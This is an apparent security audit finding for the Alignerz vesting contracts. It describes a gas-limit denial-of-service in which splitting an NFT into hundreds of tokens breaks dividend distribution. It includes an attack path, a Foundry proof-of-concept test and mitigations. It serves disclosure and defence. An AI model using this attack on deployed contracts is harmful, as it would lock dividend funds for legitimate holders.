# [000806] DOS Attack on Dividend Distribution Through NFT Splitting
  
  ### Summary

The lack of gas limit protection in the dividend distribution loops will cause a Denial of Service for all NFT holders as any malicious user will split their vesting NFT into hundreds of tokens to exceed block gas limits during dividend calculations.

### Root Cause

In `A26ZDividendDistributor.sol:_setDividends()` and `getTotalUnclaimedAmounts()`, the contract iterates over all minted NFTs without any gas limitations or pagination mechanism. Since the `AlignerzVesting` contract allows users to split their NFTs into an arbitrary number of tokens with negligible fees due to rounding down, an attacker can inflate the total NFT count to a point where these loops exceed the block gas limit, making dividend distribution impossible.

[_setDividends iteration](https://github.com/dualguard/2025-11-alignerz/blob/main/protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol#L215-L222)

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

1. Attacker participates in the bidding process and claims a vesting NFT through `claimNFT()`
2. Attacker waits for their vesting period to **_almost_** complete and claims their tokens via `claimTokens()`
3. Attacker calls `splitTVS()` with an array containing 200+ small percentage values (e.g., one percentage at 9,800 basis points and 200 percentages at 1 basis point each)
4. The split creates 200+ new NFT tokens due to minimal splitting fees from rounding
5. When the project creator attempts to distribute dividends via `setUpTheDividends()`, the function calls `getTotalUnclaimedAmounts()` which iterates through all minted NFTs
6. The loop exceeds the block gas limit and reverts, preventing any dividend distribution
7. All legitimate NFT holders are unable to receive their dividend rewards

### Impact

The protocol suffers a complete loss of dividend distribution functionality, preventing all NFT holders from claiming their rightful dividend rewards indefinitely. The attacker spends only gas costs to execute this griefing attack and gains no financial benefit, but permanently blocks a core protocol feature. In the worst case, if dividends cannot be distributed through alternative means, all accumulated dividend funds become locked in the contract.


### PoC

```solidity
import {A26ZDividendDistributor} from "../src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";

function test_DOS_POC() public {
    A26ZDividendDistributor public distributor = new A26ZDividendDistributor(address(vesting), address(nft), address(usdt), block.timestamp, 1 days, address(token));
    distributor.transferOwnership(projectCreator);
    vm.startPrank(projectCreator);
    vesting.setVestingPeriodDivisor(1);

    // 1. Launch project
    vesting.launchBiddingProject(address(token), address(usdt), block.timestamp, block.timestamp + 1_000_000, "0x0", true);

    // 2. Create multiple pools with different prices
    vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.01 ether, true);
    vesting.createPool(PROJECT_ID, 3_000_000 ether, 0.02 ether, false);
    vesting.createPool(PROJECT_ID, 4_000_000 ether, 0.03 ether, false);

    // 3. Place bids from different whitelisted users
    vesting.addUserToWhitelist(bidders[0], PROJECT_ID);
    vm.stopPrank();

    vm.startPrank(bidders[0]);
    usdt.approve(address(vesting), BIDDER_USD);
    vesting.placeBid(PROJECT_ID, BIDDER_USD, 90 days);
    vm.stopPrank();

    // 4. Prepare bid allocations (this would be done off-chain)
    BidInfo[] memory allBids = new BidInfo[](2);

    for (uint256 i = 0; i < 2; i++) {
        allBids[i] = BidInfo({
            bidder: bidders[i],
            amount: BIDDER_USD,
            vestingPeriod: 60 days,
            poolId: 0,
            accepted: true
        });
    }

    // 6. Generate merkle roots for each pool
    bytes32[] memory poolRoots = new bytes32[](3);
    for (uint256 poolId = 0; poolId < 3; poolId++) {
        poolRoots[poolId] = generateMerkleProofs(allBids, poolId);
    }

    // 7. Finalize project with merkle roots
    vm.prank(projectCreator);
    vesting.finalizeBids(PROJECT_ID, refundRoot, poolRoots, 60);

    // 8. Users claim NFTs with proofs
    uint256[] memory nftIds = new uint256[](1);
    vm.startPrank(bidders[0]);
    uint256 nftId = vesting.claimNFT(PROJECT_ID, 0, BIDDER_USD, bidderProofs[bidders[0]]);
    nftIds[0] = nftId;
    bidderNFTIds[bidders[0]] = nftId;
    assertEq(nft.ownerOf(nftId), bidders[0]);
    vm.stopPrank();

    // 9. Fast forward time to simulate vesting period
    vm.warp(block.timestamp + 60 days);

    // 10. Users claim tokens after vesting period
    uint256 tokenBalanceBefore = token.balanceOf(bidders[0]);
    vm.startPrank(bidders[0]);
    vesting.claimTokens(PROJECT_ID, nftIds[0]);
    uint256 tokenBalanceAfter = token.balanceOf(bidders[0]);
    assertTrue(tokenBalanceAfter > tokenBalanceBefore, "No tokens claimed");
    vm.stopPrank();

    // 11. Splitting TVS to multiple NFTs
    vm.startPrank(bidders[0]);
    uint256 splitNumber = 200;
    uint256[] memory percentages = new uint256[](splitNumber);
    percentages[0] = 10_000 - splitNumber + 1;
    for (uint256 i = 1; i < splitNumber; i++) {
        percentages[i] = 1;
    }

    (uint256 oldNft, uint256[] memory newNft) = vesting.splitTVS(PROJECT_ID, percentages, nftId);
    vm.stopPrank();

    // 12. Dropping 10 tokens to distributor and calling setUpTheDividends
    deal(address(usdt), address(distributor), 10 ether);

    vm.prank(projectCreator);
    distributor.setUpTheDividends(); // This will revert due to gas limit
}
```

### Mitigation

Implement one or more of the following solutions:

### Pagination
Refactor `_setDividends()` and `getTotalUnclaimedAmounts()` to process NFTs in batches across multiple transactions.

### Minimum Split Size
Enforce a minimum percentage per split (e.g., 100 basis points = 1%) to limit the maximum number of resulting NFTs

### Meaningful Splitting Fees
Ensure splitting fees do not round down to zero by implementing a minimum fee per split or using a fee structure that scales with the number of splits
  